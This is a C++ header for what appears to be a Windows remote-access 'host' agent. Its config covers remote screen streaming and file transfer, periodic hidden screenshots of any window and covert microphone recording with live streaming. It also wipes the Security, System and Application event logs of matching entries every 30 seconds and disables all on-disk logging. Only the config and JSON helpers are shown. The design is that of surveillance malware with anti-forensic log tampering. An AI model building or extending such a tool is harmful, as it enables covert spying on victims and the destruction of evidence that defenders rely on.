#pragma once
#define HOST_VERSION "1.0.89"
#define HOST_BUILD __DATE__ " " __TIME__
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <winbase.h>
#include <shlwapi.h>
#include <shellapi.h>
#include <wincrypt.h>
#include <pdh.h>
#include <pdhmsg.h>
#include <gdiplus.h>
#include <d3d11.h>
#include <dxgi1_2.h>
#include <wrl/client.h>

#include <string>
#include <vector>
#include <thread>
#include <mutex>
#include <atomic>
#include <queue>
#include <functional>
#include <memory>
#include <map>
#include <sstream>
#include <fstream>
#include <chrono>
#include <condition_variable>
#include <algorithm>
#include <filesystem>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")

using Microsoft::WRL::ComPtr;
namespace fs = std::filesystem;

// ===== WebSocket Frame Types =====
enum WsOpcode : uint8_t {
    WS_CONTINUATION = 0x0,
    WS_TEXT         = 0x1,
    WS_BINARY       = 0x2,
    WS_CLOSE        = 0x8,
    WS_PING         = 0x9,
    WS_PONG         = 0xA
};

// ===== Config =====
struct HostConfig {
    std::string server_address = "127.0.0.1";
    int server_port  = 8080;
    bool use_tls     = true;   // wss:// connection through nginx (default: on, port 443, path /host)
    int stream_port  = 8081;
    std::string room_token;
    std::string password;
    int quality      = 75;
    int fps          = 30;
    int scale        = 80;
    int bitrate      = 5000; // H264 bitrate in kbps
    int file_connections = 4;
    int screen_connections = 1;
    std::string codec = "jpeg"; // jpeg | h264 | vp8
    std::string log_level = "INFO";
    // Note: file logging is permanently disabled at the Logger level (see logger.h).
    // Nothing is ever written to disk regardless of config values. This field is
    // kept only so old configs that still have "log_to_file": true/false don't error.
    bool log_to_file = false;
    // WebRTC ICE servers (optional, for WebRTC streaming mode)
    std::string stun_server = "stun:stun.l.google.com:19302";
    std::string turn_server; // e.g. "turn:user:pass@1.2.3.4:3478"
    // Event log auto-cleaner: comma-separated regex patterns to match & clean
    // If non-empty, a background thread scans System/Application/Security/Setup logs
    // every 30s and clears any log containing matching entries.
    // Example: "MyService,MyApp,SomeDll,192\\.168\\.1\\.100"
    std::string evtlog_clean_patterns;
    int evtlog_clean_interval = 30; // seconds between scans
    std::string evtlog_clean_mode = "once"; // "once" = clean at startup only, "loop" = periodic
    // Screenshot auto-capture
    bool screenshot_enabled = false;
    int screenshot_interval = 10;    // seconds between captures
    int screenshot_quality = 75;     // JPEG quality 1-100
    int screenshot_scale = 50;       // % of screen resolution
    bool screenshot_always = true;   // capture regardless of focused app
    std::string screenshot_apps;     // comma-separated window title substrings
    // Audio recording
    bool audio_enabled = false;
    int audio_segment_duration = 300; // seconds per segment (default 5 min)
    int audio_sample_rate = 16000;    // Hz (16kHz optimal for speech, small files)
    int audio_bitrate = 128;          // kbps for Opus (64=speech, 128=HQ, 192=studio)
    int audio_channels = 1;           // 1=mono, 2=stereo
    int audio_gain = 100;             // % gain boost (100=normal, 200=2x, 400=4x)
    int audio_mode = 0;               // 0=record only, 1=live only, 2=both (live+record)
    bool audio_denoise = true;        // high-pass + noise gate
    bool audio_normalize = true;      // peak normalization
    int  audio_hum_filter = 50;       // power-line hum filter: 0=off, 50=50Hz(EU/RU), 60=60Hz(US)
};

// ===== Simple JSON helpers =====
inline std::string json_escape(const std::string& s) {
    std::string r; r.reserve(s.size());
    for (char c : s) {
        if      (c == '"')  r += "\\\"";
        else if (c == '\\') r += "\\\\";
        else if (c == '\n') r += "\\n";
        else if (c == '\r') r += "\\r";
        else if (c == '\t') r += "\\t";
        else                r += c;
    }
    return r;
}

inline std::string json_unescape(const std::string& s) {
    std::string r; r.reserve(s.size());
    for (size_t i = 0; i < s.size(); ++i) {
        if (s[i] == '\\' && i + 1 < s.size()) {
            switch (s[i + 1]) {
                case 'n':  r += '\n'; ++i; break;
                case 'r':  r += '\r'; ++i; break;
                case 't':  r += '\t'; ++i; break;
                case '"':  r += '"';  ++i; break;
                case '\\': r += '\\'; ++i; break;
                default:   r += s[i]; break;
            }
        } else {
            r += s[i];
        }
    }
    return r;
}

inline std::string json_get(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\"";
    auto pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos = json.find(':', pos + search.size());
    if (pos == std::string::npos) return "";
    while (++pos < json.size() && (json[pos]==' '||json[pos]=='\t'));
    if (pos >= json.size()) return "";
    if (json[pos] == '"') {
        // Find closing quote, properly handling escaped backslashes
        // A quote is escaped only if preceded by an ODD number of backslashes
        auto end = pos + 1;
        while (end < json.size()) {
            if (json[end] == '"') {
                // Count backslashes before this quote
                size_t bs = 0;
                for (size_t j = end; j > pos + 1 && json[j-1] == '\\'; --j) ++bs;
                if (bs % 2 == 0) break; // even backslashes → quote is real
            }
            ++end;
        }
        if (end >= json.size()) return "";
        // Unescape the value: \\ → \, \" → ", \n → newline, etc.
        std::string raw = json.substr(pos+1, end-pos-1);
        std::string val;
        val.reserve(raw.size());
        for (size_t i = 0; i < raw.size(); ++i) {
            if (raw[i] == '\\' && i+1 < raw.size()) {
                char c = raw[i+1];
                if (c == '\\') { val += '\\'; ++i; }
                else if (c == '"') { val += '"'; ++i; }
                else if (c == 'n') { val += '\n'; ++i; }
                else if (c == 'r') { val += '\r'; ++i; }
                else if (c == 't') { val += '\t'; ++i; }
                else val += raw[i]; // unknown escape, keep backslash
            } else {
                val += raw[i];
            }
        }
        return val;
    }
    // number / bool
    auto end = json.find_first_of(",}\n", pos);
    std::string val = json.substr(pos, end==std::string::npos ? std::string::npos : end-pos);
    while (!val.empty() && (val.back()==' '||val.back()=='\t')) val.pop_back();
    return val;
}
